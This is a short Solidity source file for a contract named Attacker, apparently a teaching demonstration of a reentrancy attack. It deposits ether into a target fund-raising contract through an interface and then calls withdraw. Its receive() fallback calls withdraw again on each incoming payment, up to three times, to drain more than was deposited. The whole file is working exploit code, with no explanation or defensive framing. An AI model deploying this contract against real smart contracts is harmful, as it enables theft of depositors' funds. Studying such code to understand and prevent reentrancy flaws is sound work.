//"SPDX-License-Identifier:UNLICENSED
pragma solidity 0.7.5;

interface FundInterface{
    function deposit()external payable returns(uint);
    function withdraw()external;
}

contract Attacker{
    FundInterface fundRaiser;
    uint drainCount = 0;
    
    constructor(address _address){
        fundRaiser = FundInterface(_address);
    }
    
    receive() external payable{
        if(drainCount < 3){
            drainCount ++;
            fundRaiser.withdraw();
        }
    }
    
    function getFunds()public view returns(uint){
        return address(this).balance;
    }
    
    function depositFunds() public payable{
        fundRaiser.deposit{value: msg.value}();
    }
    
    function withdrawFunds() public {
        fundRaiser.withdraw();
      
    }
    
}
